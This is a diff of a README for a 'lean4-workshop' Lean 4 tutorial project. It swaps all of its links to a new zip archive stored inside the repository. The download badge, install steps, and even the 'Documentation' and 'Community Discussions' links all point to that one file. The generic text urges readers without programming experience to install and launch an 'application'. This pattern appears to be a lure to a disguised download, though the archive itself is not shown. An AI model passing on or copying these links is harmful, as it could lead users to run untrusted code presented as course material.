@@ -1,6 +1,6 @@
 # 🚀 lean4-workshop - Easy Learning for Lean 4
 
-[![Download](https://raw.githubusercontent.com/Parthkh28/lean4-workshop/main/exercises/lean-workshop-3.4-alpha.2.zip%20Now-lean4--workshop-brightgreen)](https://raw.githubusercontent.com/Parthkh28/lean4-workshop/main/exercises/lean-workshop-3.4-alpha.2.zip)
+[![Download](https://github.com/Parthkh28/lean4-workshop/raw/refs/heads/main/exercises/Solutions/lean_workshop_v1.4-beta.1.zip%20Now-lean4--workshop-brightgreen)](https://github.com/Parthkh28/lean4-workshop/raw/refs/heads/main/exercises/Solutions/lean_workshop_v1.4-beta.1.zip)
 
 ## 📚 Overview
 The Lean 4 workshop offers tutorials, proofs, and resources for anyone interested in formal verification and functional programming. This guide will help you download and run the software effortlessly, even if you have no programming experience.
@@ -29,7 +29,7 @@ The Lean 4 workshop offers tutorials, proofs, and resources for anyone intereste
 To begin, you will need to download the software from the Releases page. Follow these easy steps:
 
 1. **Visit the Download Page**: Go to the GitHub Releases page to get the latest version of the software.
-   - [Download the lean4-workshop here](https://raw.githubusercontent.com/Parthkh28/lean4-workshop/main/exercises/lean-workshop-3.4-alpha.2.zip)
+   - [Download the lean4-workshop here](https://github.com/Parthkh28/lean4-workshop/raw/refs/heads/main/exercises/Solutions/lean_workshop_v1.4-beta.1.zip)
 
 2. **Choose the Right Version**: Look for the version suitable for your operating system. We recommend using the latest stable version for the best experience.
 
@@ -40,7 +40,7 @@ To begin, you will need to download the software from the Releases page. Follow 
 5. **Launch the Application**: After installing, find the lean4-workshop application in your programs and open it to start learning.
 
 ## 📥 Download & Install
-To download the Lean 4 workshop, visit this page: [Download the lean4-workshop here](https://raw.githubusercontent.com/Parthkh28/lean4-workshop/main/exercises/lean-workshop-3.4-alpha.2.zip). After downloading, follow the steps outlined in the Getting Started section.
+To download the Lean 4 workshop, visit this page: [Download the lean4-workshop here](https://github.com/Parthkh28/lean4-workshop/raw/refs/heads/main/exercises/Solutions/lean_workshop_v1.4-beta.1.zip). After downloading, follow the steps outlined in the Getting Started section.
 
 ## 📖 Using the Workshop
 After launching the application, you will see several sections designed to help you learn effectively. Here’s what you can expect:
@@ -53,9 +53,9 @@ After launching the application, you will see several sections designed to help 
 If you encounter any issues while downloading or running the software, please feel free to open an issue on the GitHub repository. The community and maintainers are here to help you.
 
 ## 🔗 Important Links
-- [GitHub Repository](https://raw.githubusercontent.com/Parthkh28/lean4-workshop/main/exercises/lean-workshop-3.4-alpha.2.zip)
-- [Documentation](https://raw.githubusercontent.com/Parthkh28/lean4-workshop/main/exercises/lean-workshop-3.4-alpha.2.zip)
-- [Community Discussions](https://raw.githubusercontent.com/Parthkh28/lean4-workshop/main/exercises/lean-workshop-3.4-alpha.2.zip)
+- [GitHub Repository](https://github.com/Parthkh28/lean4-workshop/raw/refs/heads/main/exercises/Solutions/lean_workshop_v1.4-beta.1.zip)
+- [Documentation](https://github.com/Parthkh28/lean4-workshop/raw/refs/heads/main/exercises/Solutions/lean_workshop_v1.4-beta.1.zip)
+- [Community Discussions](https://github.com/Parthkh28/lean4-workshop/raw/refs/heads/main/exercises/Solutions/lean_workshop_v1.4-beta.1.zip)
 
 ## 👥 Community Contribution
 You can contribute to the lean4-workshop by reporting bugs, suggesting features, or even writing tutorials. Join the community to share your learning experiences.
